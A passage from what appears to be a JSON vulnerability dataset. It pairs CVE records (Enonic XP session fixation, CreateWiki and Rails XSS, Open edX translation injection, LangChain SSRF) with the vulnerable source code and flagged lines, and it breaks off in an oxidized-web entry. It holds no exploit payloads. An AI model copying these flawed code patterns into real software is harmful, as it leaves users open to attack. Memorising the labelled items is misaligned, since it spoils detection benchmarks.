          "name": "modules/lib/lib-auth/src/main/java/com/enonic/xp/lib/auth/LoginHandler.java",
          "content": "package com.enonic.xp.lib.auth;\n\nimport java.util.Comparator;\nimport java.util.concurrent.Callable;\nimport java.util.function.Supplier;\nimport java.util.stream.Collectors;\n\nimport javax.servlet.http.HttpSession;\n\nimport com.enonic.xp.context.Context;\nimport com.enonic.xp.context.ContextBuilder;\nimport com.enonic.xp.portal.PortalRequest;\nimport com.enonic.xp.script.bean.BeanContext;\nimport com.enonic.xp.script.bean.ScriptBean;\nimport com.enonic.xp.security.IdProvider;\nimport com.enonic.xp.security.IdProviderKey;\nimport com.enonic.xp.security.IdProviders;\nimport com.enonic.xp.security.RoleKeys;\nimport com.enonic.xp.security.SecurityConstants;\nimport com.enonic.xp.security.SecurityService;\nimport com.enonic.xp.security.SystemConstants;\nimport com.enonic.xp.security.User;\nimport com.enonic.xp.security.auth.AuthenticationInfo;\nimport com.enonic.xp.security.auth.EmailPasswordAuthToken;\nimport com.enonic.xp.security.auth.UsernamePasswordAuthToken;\nimport com.enonic.xp.security.auth.VerifiedEmailAuthToken;\nimport com.enonic.xp.security.auth.VerifiedUsernameAuthToken;\nimport com.enonic.xp.session.Session;\n\npublic final class LoginHandler\n    implements ScriptBean\n{\n    private enum Scope\n    {\n        SESSION, REQUEST, NONE\n    }\n\n    private String user;\n\n    private String password;\n\n    private boolean skipAuth;\n\n    private String[] idProvider;\n\n    private Integer sessionTimeout;\n\n    private Scope scope;\n\n    private Supplier<SecurityService> securityService;\n\n    private Supplier<Context> context;\n\n    private Supplier<PortalRequest> portalRequestSupplier;\n\n    public void setUser( final String user )\n    {\n        this.user = user;\n    }\n\n    public void setPassword( final String password )\n    {\n        this.password = password;\n    }\n\n    public void setSkipAuth( final boolean skipAuth )\n    {\n        this.skipAuth = skipAuth;\n    }\n\n    public void setIdProvider( final String[] idProvider )\n    {\n        this.idProvider = idProvider;\n    }\n\n    public void setSessionTimeout( final Integer sessionTimeout )\n    {\n        this.sessionTimeout = sessionTimeout;\n    }\n\n    public void setScope( final String scope )\n    {\n        this.scope = Scope.valueOf( scope );\n    }\n\n    public LoginResultMapper login()\n    {\n        AuthenticationInfo authInfo = noIdProviderSpecified() ? attemptLoginWithAllExistingIdProviders() : attemptLogin();\n\n        if ( authInfo.isAuthenticated() )\n        {\n            switch ( this.scope )\n            {\n                case NONE:\n                    // do nothing\n                    break;\n                case REQUEST:\n                    this.context.get().getLocalScope().setAttribute( authInfo );\n                    break;\n                case SESSION:\n                default:\n                    createSession( authInfo );\n                    break;\n            }\n\n            return new LoginResultMapper( authInfo );\n        }\n        else\n        {\n            return new LoginResultMapper( authInfo, \"Access Denied\" );\n        }\n    }\n\n    private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }\n\n    private boolean noIdProviderSpecified()\n    {\n        return this.idProvider == null || this.idProvider.length == 0;\n    }\n\n    private AuthenticationInfo attemptLoginWithAllExistingIdProviders()\n    {\n        final IdProviders idProviders = runAsAuthenticated( this::getSortedIdProviders );\n\n        for ( IdProvider idProvider : idProviders )\n        {\n            final AuthenticationInfo authInfo = authenticate( idProvider.getKey() );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }\n\n    private AuthenticationInfo attemptLogin()\n    {\n\n        for ( String uStore : idProvider )\n        {\n            final AuthenticationInfo authInfo = authenticate( IdProviderKey.from( uStore ) );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private AuthenticationInfo authenticate( IdProviderKey idProvider )\n    {\n        AuthenticationInfo authInfo = null;\n\n        if ( isValidEmail( this.user ) )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedEmailAuthToken verifiedEmailAuthToken = new VerifiedEmailAuthToken();\n                verifiedEmailAuthToken.setEmail( this.user );\n                verifiedEmailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( verifiedEmailAuthToken ) );\n            }\n            else\n            {\n                final EmailPasswordAuthToken emailAuthToken = new EmailPasswordAuthToken();\n                emailAuthToken.setEmail( this.user );\n                emailAuthToken.setPassword( this.password );\n                emailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( emailAuthToken ) );\n            }\n        }\n\n        if ( authInfo == null || !authInfo.isAuthenticated() )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedUsernameAuthToken usernameAuthToken = new VerifiedUsernameAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n            else\n            {\n                final UsernamePasswordAuthToken usernameAuthToken = new UsernamePasswordAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setPassword( this.password );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n        }\n\n        return authInfo;\n    }\n\n    private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }\n\n    private boolean isValidEmail( final String value )\n    {\n        return value != null && value.chars().filter( ch -> ch == '@' ).count() == 1;\n    }\n\n    private void setSessionTimeout()\n    {\n        final PortalRequest portalRequest = this.portalRequestSupplier.get();\n        if ( portalRequest != null )\n        {\n            final HttpSession httpSession = portalRequest.getRawRequest().getSession();\n            if ( httpSession != null )\n            {\n                httpSession.setMaxInactiveInterval( this.sessionTimeout );\n            }\n        }\n    }\n\n    @Override\n    public void initialize( final BeanContext context )\n    {\n        this.securityService = context.getService( SecurityService.class );\n        this.context = context.getBinding( Context.class );\n        this.portalRequestSupplier = context.getBinding( PortalRequest.class );\n    }\n}\n"
        }
      ],
      "method_level": [
        "private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }",
        "private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }",
        "private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 116,
          "content": "        final Session session = this.context.get().getLocalScope().getSession();"
        },
        {
          "line_no": 119,
          "content": "            session.setAttribute( authInfo );"
        },
        {
          "line_no": 120,
          "content": "        }"
        },
        {
          "line_no": 122,
          "content": "        if ( this.sessionTimeout != null )"
        },
        {
          "line_no": 123,
          "content": "        {"
        },
        {
          "line_no": 124,
          "content": "            setSessionTimeout();"
        },
        {
          "line_no": 152,
          "content": "        return IdProviders.from( idProviders.stream()."
        },
        {
          "line_no": 153,
          "content": "            sorted( Comparator.comparing( u -> u.getKey().toString() ) )."
        },
        {
          "line_no": 154,
          "content": "            collect( Collectors.toList() ) );"
        },
        {
          "line_no": 224,
          "content": "        return ContextBuilder.from( this.context.get() )."
        },
        {
          "line_no": 225,
          "content": "            authInfo( authInfo )."
        },
        {
          "line_no": 226,
          "content": "            repositoryId( SystemConstants.SYSTEM_REPO_ID )."
        },
        {
          "line_no": 227,
          "content": "            branch( SecurityConstants.BRANCH_SECURITY ).build()."
        },
        {
          "line_no": 228,
          "content": "            callWith( runnable );"
        }
      ]
    },
    "cwe": [
      "CWE-384"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 1221,
    "cve": "CVE-2024-47781",
    "description": "CreateWiki is an extension used at Miraheze for requesting & creating wikis. The name of requested wikis is not escaped on Special:RequestWikiQueue, so a user can insert arbitrary HTML that is displayed in the request wiki queue when requesting a wiki. If a wiki creator comes across the XSS payload, their user session can be abused to retrieve deleted wiki requests, which typically contains private information. Likewise, this can also be abused on those with the ability to suppress requests to view sensitive information. This issue has been patched with commit `693a220` and all users are advised to apply the patch. Users unable to upgrade should disable Javascript and/or prevent access to the vulnerable page (Special:RequestWikiQueue).",
    "vulnerability": {
      "file_level": [
        {
          "name": "includes/RequestWiki/RequestWikiQueuePager.php",
          "content": "<?php\n\nnamespace Miraheze\\CreateWiki\\RequestWiki;\n\nuse MediaWiki\\Config\\Config;\nuse MediaWiki\\Context\\IContextSource;\nuse MediaWiki\\Linker\\LinkRenderer;\nuse MediaWiki\\Pager\\TablePager;\nuse MediaWiki\\Permissions\\PermissionManager;\nuse MediaWiki\\SpecialPage\\SpecialPage;\nuse MediaWiki\\User\\UserFactory;\nuse Miraheze\\CreateWiki\\ConfigNames;\nuse Wikimedia\\Rdbms\\IConnectionProvider;\n\nclass RequestWikiQueuePager extends TablePager {\n\n\tprivate LinkRenderer $linkRenderer;\n\tprivate PermissionManager $permissionManager;\n\tprivate UserFactory $userFactory;\n\n\tprivate string $dbname;\n\tprivate string $requester;\n\tprivate string $status;\n\n\tpublic function __construct(\n\t\tConfig $config,\n\t\tIContextSource $context,\n\t\tIConnectionProvider $connectionProvider,\n\t\tLinkRenderer $linkRenderer,\n\t\tPermissionManager $permissionManager,\n\t\tUserFactory $userFactory,\n\t\tstring $dbname,\n\t\tstring $requester,\n\t\tstring $status\n\t) {\n\t\tparent::__construct( $context, $linkRenderer );\n\n\t\t$this->mDb = $connectionProvider->getReplicaDatabase(\n\t\t\t$config->get( ConfigNames::GlobalWiki )\n\t\t);\n\n\t\t$this->linkRenderer = $linkRenderer;\n\t\t$this->permissionManager = $permissionManager;\n\t\t$this->userFactory = $userFactory;\n\n\t\t$this->dbname = $dbname;\n\t\t$this->requester = $requester;\n\t\t$this->status = $status;\n\t}\n\n\t/** @inheritDoc */\n\tpublic function getFieldNames(): array {\n\t\treturn [\n\t\t\t'cw_timestamp' => $this->msg( 'requestwikiqueue-request-label-requested-date' )->text(),\n\t\t\t'cw_dbname' => $this->msg( 'createwiki-label-dbname' )->text(),\n\t\t\t'cw_sitename' => $this->msg( 'requestwikiqueue-request-label-sitename' )->text(),\n\t\t\t'cw_user' => $this->msg( 'requestwikiqueue-request-label-requester' )->text(),\n\t\t\t'cw_language' => $this->msg( 'requestwikiqueue-request-label-language' )->text(),\n\t\t\t'cw_url' => $this->msg( 'requestwikiqueue-request-label-url' )->text(),\n\t\t\t'cw_status' => $this->msg( 'requestwikiqueue-request-label-status' )->text(),\n\t\t];\n\t}\n\n\t/** @inheritDoc */\n\tpublic function formatValue( $name, $value ): string {\n\t\t$row = $this->mCurrentRow;\n\n\t\tswitch ( $name ) {\n\t\t\tcase 'cw_timestamp':\n\t\t\t\t$language = $this->getLanguage();\n\t\t\t\t$formatted = $language->timeanddate( $row->cw_timestamp, true );\n\t\t\t\tbreak;\n\t\t\tcase 'cw_dbname':\n\t\t\t\t$formatted = $row->cw_dbname;\n\t\t\t\tbreak;\n\t\t\tcase 'cw_sitename':\n\t\t\t\t$formatted = $row->cw_sitename;\n\t\t\t\tbreak;\n\t\t\tcase 'cw_user':\n\t\t\t\t$formatted = $this->userFactory->newFromId( $row->cw_user )->getName();\n\t\t\t\tbreak;\n\t\t\tcase 'cw_url':\n\t\t\t\t$formatted = $row->cw_url;\n\t\t\t\tbreak;\n\t\t\tcase 'cw_status':\n\t\t\t\t$formatted = $this->linkRenderer->makeLink(\n\t\t\t\t\tSpecialPage::getTitleValueFor( 'RequestWikiQueue', $row->cw_id ),\n\t\t\t\t\t$row->cw_status\n\t\t\t\t);\n\t\t\t\tbreak;\n\t\t\tcase 'cw_language':\n\t\t\t\t$formatted = $row->cw_language;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\t$formatted = \"Unable to format $name\";\n\t\t}\n\n\t\treturn $formatted;\n\t}\n\n\t/** @inheritDoc */\n\tpublic function getQueryInfo(): array {\n\t\t$user = $this->getUser();\n\n\t\t$visibility = $this->permissionManager->userHasRight( $user, 'createwiki' ) ? 1 : 0;\n\n\t\t$info = [\n\t\t\t'tables' => [\n\t\t\t\t'cw_requests',\n\t\t\t],\n\t\t\t'fields' => [\n\t\t\t\t'cw_id',\n\t\t\t\t'cw_timestamp',\n\t\t\t\t'cw_dbname',\n\t\t\t\t'cw_language',\n\t\t\t\t'cw_user',\n\t\t\t\t'cw_status',\n\t\t\t\t'cw_url',\n\t\t\t\t'cw_sitename',\n\t\t\t],\n\t\t\t'conds' => [\n\t\t\t\t'cw_visibility <= ' . $visibility,\n\t\t\t],\n\t\t\t'joins_conds' => [],\n\t\t];\n\n\t\tif ( $this->dbname ) {\n\t\t\t$info['conds']['cw_dbname'] = $this->dbname;\n\t\t}\n\n\t\tif ( $this->requester ) {\n\t\t\t$info['conds']['cw_user'] = $this->userFactory->newFromName( $this->requester )->getId();\n\t\t}\n\n\t\tif ( $this->status && $this->status !== '*' ) {\n\t\t\t$info['conds']['cw_status'] = $this->status;\n\t\t} elseif ( !$this->status ) {\n\t\t\t$info['conds']['cw_status'] = 'inreview';\n\t\t}\n\n\t\treturn $info;\n\t}\n\n\t/** @inheritDoc */\n\tpublic function getDefaultSort(): string {\n\t\treturn 'cw_id';\n\t}\n\n\t/** @inheritDoc */\n\tpublic function isFieldSortable( $name ): bool {\n\t\treturn $name !== 'cw_user';\n\t}\n}\n"
        }
      ],
      "method_level": [
        "public function formatValue( $name, $value ): string {\n\t\t$row = $this->mCurrentRow;\n\n\t\tswitch ( $name ) {\n\t\t\tcase 'cw_timestamp':\n\t\t\t\t$language = $this->getLanguage();\n\t\t\t\t$formatted = $language->timeanddate( $row->cw_timestamp, true );\n\t\t\t\tbreak;\n\t\t\tcase 'cw_dbname':\n\t\t\t\t$formatted = $row->cw_dbname;\n\t\t\t\tbreak;\n\t\t\tcase 'cw_sitename':\n\t\t\t\t$formatted = $row->cw_sitename;\n\t\t\t\tbreak;\n\t\t\tcase 'cw_user':\n\t\t\t\t$formatted = $this->userFactory->newFromId( $row->cw_user )->getName();\n\t\t\t\tbreak;\n\t\t\tcase 'cw_url':\n\t\t\t\t$formatted = $row->cw_url;\n\t\t\t\tbreak;\n\t\t\tcase 'cw_status':\n\t\t\t\t$formatted = $this->linkRenderer->makeLink(\n\t\t\t\t\tSpecialPage::getTitleValueFor( 'RequestWikiQueue', $row->cw_id ),\n\t\t\t\t\t$row->cw_status\n\t\t\t\t);\n\t\t\t\tbreak;\n\t\t\tcase 'cw_language':\n\t\t\t\t$formatted = $row->cw_language;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\t$formatted = \"Unable to format $name\";\n\t\t}\n\n\t\treturn $formatted;\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 71,
          "content": "\t\t\t\t$formatted = $language->timeanddate( $row->cw_timestamp, true );"
        },
        {
          "line_no": 74,
          "content": "\t\t\t\t$formatted = $row->cw_dbname;"
        },
        {
          "line_no": 77,
          "content": "\t\t\t\t$formatted = $row->cw_sitename;"
        },
        {
          "line_no": 80,
          "content": "\t\t\t\t$formatted = $this->userFactory->newFromId( $row->cw_user )->getName();"
        },
        {
          "line_no": 83,
          "content": "\t\t\t\t$formatted = $row->cw_url;"
        },
        {
          "line_no": 92,
          "content": "\t\t\t\t$formatted = $row->cw_language;"
        },
        {
          "line_no": 95,
          "content": "\t\t\t\t$formatted = \"Unable to format $name\";"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 4.0
  },
  {
    "id": 376,
    "cve": "CVE-2024-26143",
    "description": "Rails is a web-application framework. There is a possible XSS vulnerability when using the translation helpers in Action Controller. Applications using translation methods like translate, or t on a controller, with a key ending in \"_html\", a :default key which contains untrusted user input, and the resulting string is used in a view, may be susceptible to an XSS vulnerability. The vulnerability is fixed in 7.1.3.1 and 7.0.8.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "actionpack/lib/abstract_controller/translation.rb",
          "content": "# frozen_string_literal: true\n\nrequire \"active_support/html_safe_translation\"\n\nmodule AbstractController\n  module Translation\n    # Delegates to <tt>I18n.translate</tt>.\n    #\n    # When the given key starts with a period, it will be scoped by the current\n    # controller and action. So if you call <tt>translate(\".foo\")</tt> from\n    # <tt>PeopleController#index</tt>, it will convert the call to\n    # <tt>I18n.translate(\"people.index.foo\")</tt>. This makes it less repetitive\n    # to translate many keys within the same controller / action and gives you a\n    # simple framework for scoping them consistently.\n    def translate(key, **options)\n      if key&.start_with?(\".\")\n        path = controller_path.tr(\"/\", \".\")\n        defaults = [:\"#{path}#{key}\"]\n        defaults << options[:default] if options[:default]\n        options[:default] = defaults.flatten\n        key = \"#{path}.#{action_name}#{key}\"\n      end\n\n      ActiveSupport::HtmlSafeTranslation.translate(key, **options)\n    end\n    alias :t :translate\n\n    # Delegates to <tt>I18n.localize</tt>.\n    def localize(object, **options)\n      I18n.localize(object, **options)\n    end\n    alias :l :localize\n  end\nend\n"
        }
      ],
      "method_level": [
        "def translate(key, **options)\n      if key&.start_with?(\".\")\n        path = controller_path.tr(\"/\", \".\")\n        defaults = [:\"#{path}#{key}\"]\n        defaults << options[:default] if options[:default]\n        options[:default] = defaults.flatten\n        key = \"#{path}.#{action_name}#{key}\"\n      end\n\n      ActiveSupport::HtmlSafeTranslation.translate(key, **options)\n    end"
      ],
      "hunk_level": [
        {
          "line_no": 24,
          "content": "      ActiveSupport::HtmlSafeTranslation.translate(key, **options)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 1114,
    "cve": "CVE-2024-43782",
    "description": "This openedx-translations repository contains translation files from Open edX repositories to be kept in sync with Transifex. Before moving to pulling translations from the openedx-translations repository via openedx-atlas, translations in the edx-platform repository were validated using edx-i18n-tools. This validation included protection against malformed translations and translations-based script injections. Prior to this patch, the validation implemented in the openedx-translations repository did not include the same protections. The maintainer inspected the translations in the edx-platform directory of both the main and open-release/redwood.master branches of the openedx-translations repository and found no evidence of exploited translation strings.",
    "vulnerability": {
      "file_level": [
        {
          "name": "scripts/validate_translation_files.py",
          "content": "\"\"\"\nValidate translation files using GNU gettext `msgfmt` command.\n\"\"\"\n\nimport argparse\nimport os\nimport os.path\nimport subprocess\nimport sys\n\n\ndef get_translation_files(translation_directory):\n    \"\"\"\n    List all translations '*.po' files in the specified directory.\n    \"\"\"\n    po_files = []\n    for root, _dirs, files in os.walk(translation_directory):\n        for file_name in files:\n            pofile_path = os.path.join(root, file_name)\n            if file_name.endswith('.po') and '/en/LC_MESSAGES/' not in pofile_path:\n                po_files.append(pofile_path)\n    return po_files\n\n\ndef validate_translation_file(po_file):\n    \"\"\"\n    Validate a translation file and return errors if any.\n\n    This function combines both stderr and stdout output of the `msgfmt` in a\n    single variable.\n    \"\"\"\n    completed_process = subprocess.run(\n        ['msgfmt', '-v', '--strict', '--check', po_file],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n    )\n\n    stdout = completed_process.stdout.decode(encoding='utf-8', errors='replace')\n    stderr = completed_process.stderr.decode(encoding='utf-8', errors='replace')\n\n    return {\n        'valid': completed_process.returncode == 0,\n        'output': f'{stdout}\\n{stderr}',\n    }\n\n\ndef validate_translation_files(\n    translations_dir='translations',\n):\n    \"\"\"\n    Run GNU gettext `msgfmt` and print errors to stderr.\n\n    Returns integer OS Exit code:\n\n      return 0 for valid translation.\n      return 1 for invalid translations.\n    \"\"\"\n    translations_valid = True\n\n    invalid_lines = []\n\n    po_files = get_translation_files(translations_dir)\n    for po_file in po_files:\n        result = validate_translation_file(po_file)\n\n        if result['valid']:\n            print('VALID: ' + po_file)\n            print(result['output'], '\\n' * 2)\n        else:\n            invalid_lines.append('INVALID: ' + po_file)\n            invalid_lines.append(result['output'] + '\\n' * 2)\n            translations_valid = False\n\n    # Print validation errors in the bottom for easy reading\n    print('\\n'.join(invalid_lines), file=sys.stderr)\n\n    if translations_valid:\n        print('-----------------------------------------')\n        print('SUCCESS: All translation files are valid.')\n        print('-----------------------------------------')\n        exit_code = 0\n    else:\n        print('---------------------------------------', file=sys.stderr)\n        print('FAILURE: Some translations are invalid.', file=sys.stderr)\n        print('---------------------------------------', file=sys.stderr)\n        exit_code = 1\n\n    return exit_code\n\n\ndef main():  # pragma: no cover\n    parser = argparse.ArgumentParser(description=__doc__)\n    parser.add_argument('--dir', action='store', type=str, default='translations')\n    args = parser.parse_args()\n    sys.exit(validate_translation_files(\n        translations_dir=args.dir,\n    ))\n\n\nif __name__ == '__main__':\n    main()  # pragma: no cover\n"
        }
      ],
      "method_level": [
        "def validate_translation_file(po_file):\n    \"\"\"\n    Validate a translation file and return errors if any.\n\n    This function combines both stderr and stdout output of the `msgfmt` in a\n    single variable.\n    \"\"\"\n    completed_process = subprocess.run(\n        ['msgfmt', '-v', '--strict', '--check', po_file],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n    )\n\n    stdout = completed_process.stdout.decode(encoding='utf-8', errors='replace')\n    stderr = completed_process.stderr.decode(encoding='utf-8', errors='replace')\n\n    return {\n        'valid': completed_process.returncode == 0,\n        'output': f'{stdout}\\n{stderr}',\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 38,
          "content": "    stdout = completed_process.stdout.decode(encoding='utf-8', errors='replace')"
        },
        {
          "line_no": 39,
          "content": "    stderr = completed_process.stderr.decode(encoding='utf-8', errors='replace')"
        },
        {
          "line_no": 42,
          "content": "        'valid': completed_process.returncode == 0,"
        },
        {
          "line_no": 43,
          "content": "        'output': f'{stdout}\\n{stderr}',"
        }
      ]
    },
    "cwe": [
      "CWE-74"
    ],
    "severity": "HIGH",
    "cvss_score": 7.7,
    "cvss_version": 3.1
  },
  {
    "id": 346,
    "cve": "CVE-2024-0243",
    "description": "With the following crawler configuration:\n\n```python\nfrom bs4 import BeautifulSoup as Soup\n\nurl = \"https://example.com\"\nloader = RecursiveUrlLoader(\n    url=url, max_depth=2, extractor=lambda x: Soup(x, \"html.parser\").text\n)\ndocs = loader.load()\n```\n\nAn attacker in control of the contents of `https://example.com` could place a malicious HTML file in there with links like \"https://example.completely.different/my_file.html\" and the crawler would proceed to download that file as well even though `prevent_outside=True`.\n\nhttps://github.com/langchain-ai/langchain/blob/bf0b3cc0b5ade1fb95a5b1b6fa260e99064c2e22/libs/community/langchain_community/document_loaders/recursive_url_loader.py#L51-L51\n\nResolved in https://github.com/langchain-ai/langchain/pull/15559",
    "vulnerability": {
      "file_level": [
        {
          "name": "libs/core/langchain_core/utils/html.py",
          "content": "import re\nfrom typing import List, Optional, Sequence, Union\nfrom urllib.parse import urljoin, urlparse\n\nPREFIXES_TO_IGNORE = (\"javascript:\", \"mailto:\", \"#\")\nSUFFIXES_TO_IGNORE = (\n    \".css\",\n    \".js\",\n    \".ico\",\n    \".png\",\n    \".jpg\",\n    \".jpeg\",\n    \".gif\",\n    \".svg\",\n    \".csv\",\n    \".bz2\",\n    \".zip\",\n    \".epub\",\n)\nSUFFIXES_TO_IGNORE_REGEX = (\n    \"(?!\" + \"|\".join([re.escape(s) + r\"[\\#'\\\"]\" for s in SUFFIXES_TO_IGNORE]) + \")\"\n)\nPREFIXES_TO_IGNORE_REGEX = (\n    \"(?!\" + \"|\".join([re.escape(s) for s in PREFIXES_TO_IGNORE]) + \")\"\n)\nDEFAULT_LINK_REGEX = (\n    rf\"href=[\\\"']{PREFIXES_TO_IGNORE_REGEX}((?:{SUFFIXES_TO_IGNORE_REGEX}.)*?)[\\#'\\\"]\"\n)\n\n\ndef find_all_links(\n    raw_html: str, *, pattern: Union[str, re.Pattern, None] = None\n) -> List[str]:\n    \"\"\"Extract all links from a raw html string.\n\n    Args:\n        raw_html: original html.\n        pattern: Regex to use for extracting links from raw html.\n\n    Returns:\n        List[str]: all links\n    \"\"\"\n    pattern = pattern or DEFAULT_LINK_REGEX\n    return list(set(re.findall(pattern, raw_html)))\n\n\ndef extract_sub_links(\n    raw_html: str,\n    url: str,\n    *,\n    base_url: Optional[str] = None,\n    pattern: Union[str, re.Pattern, None] = None,\n    prevent_outside: bool = True,\n    exclude_prefixes: Sequence[str] = (),\n) -> List[str]:\n    \"\"\"Extract all links from a raw html string and convert into absolute paths.\n\n    Args:\n        raw_html: original html.\n        url: the url of the html.\n        base_url: the base url to check for outside links against.\n        pattern: Regex to use for extracting links from raw html.\n        prevent_outside: If True, ignore external links which are not children\n            of the base url.\n        exclude_prefixes: Exclude any URLs that start with one of these prefixes.\n\n    Returns:\n        List[str]: sub links\n    \"\"\"\n    base_url = base_url if base_url is not None else url\n    all_links = find_all_links(raw_html, pattern=pattern)\n    absolute_paths = set()\n    for link in all_links:\n        # Some may be absolute links like https://to/path\n        if link.startswith(\"http\"):\n            absolute_paths.add(link)\n        # Some may have omitted the protocol like //to/path\n        elif link.startswith(\"//\"):\n            absolute_paths.add(f\"{urlparse(url).scheme}:{link}\")\n        else:\n            absolute_paths.add(urljoin(url, link))\n    res = []\n    for path in absolute_paths:\n        if any(path.startswith(exclude) for exclude in exclude_prefixes):\n            continue\n        if prevent_outside and not path.startswith(base_url):\n            continue\n        res.append(path)\n    return res\n"
        }
      ],
      "method_level": [
        "def extract_sub_links(\n    raw_html: str,\n    url: str,\n    *,\n    base_url: Optional[str] = None,\n    pattern: Union[str, re.Pattern, None] = None,\n    prevent_outside: bool = True,\n    exclude_prefixes: Sequence[str] = (),\n) -> List[str]:\n    \"\"\"Extract all links from a raw html string and convert into absolute paths.\n\n    Args:\n        raw_html: original html.\n        url: the url of the html.\n        base_url: the base url to check for outside links against.\n        pattern: Regex to use for extracting links from raw html.\n        prevent_outside: If True, ignore external links which are not children\n            of the base url.\n        exclude_prefixes: Exclude any URLs that start with one of these prefixes.\n\n    Returns:\n        List[str]: sub links\n    \"\"\"\n    base_url = base_url if base_url is not None else url\n    all_links = find_all_links(raw_html, pattern=pattern)\n    absolute_paths = set()\n    for link in all_links:\n        # Some may be absolute links like https://to/path\n        if link.startswith(\"http\"):\n            absolute_paths.add(link)\n        # Some may have omitted the protocol like //to/path\n        elif link.startswith(\"//\"):\n            absolute_paths.add(f\"{urlparse(url).scheme}:{link}\")\n        else:\n            absolute_paths.add(urljoin(url, link))\n    res = []\n    for path in absolute_paths:\n        if any(path.startswith(exclude) for exclude in exclude_prefixes):\n            continue\n        if prevent_outside and not path.startswith(base_url):\n            continue\n        res.append(path)\n    return res"
      ],
      "hunk_level": [
        {
          "line_no": 70,
          "content": "    base_url = base_url if base_url is not None else url"
        },
        {
          "line_no": 75,
          "content": "        if link.startswith(\"http\"):"
        },
        {
          "line_no": 76,
          "content": "            absolute_paths.add(link)"
        },
        {
          "line_no": 79,
          "content": "            absolute_paths.add(f\"{urlparse(url).scheme}:{link}\")"
        },
        {
          "line_no": 81,
          "content": "            absolute_paths.add(urljoin(url, link))"
        },
        {
          "line_no": 82,
          "content": "    res = []"
        },
        {
          "line_no": 84,
          "content": "        if any(path.startswith(exclude) for exclude in exclude_prefixes):"
        },
        {
          "line_no": 85,
          "content": "            continue"
        },
        {
          "line_no": 86,
          "content": "        if prevent_outside and not path.startswith(base_url):"
        },
        {
          "line_no": 88,
          "content": "        res.append(path)"
        },
        {
          "line_no": 89,
          "content": "    return res"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 48,
    "cve": "CVE-2025-27590",
    "description": "In oxidized-web (aka Oxidized Web) before 0.15.0, the RANCID migration page allows an unauthenticated user to gain control over the Linux user account that is running oxidized-web.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/oxidized/web/mig.rb",
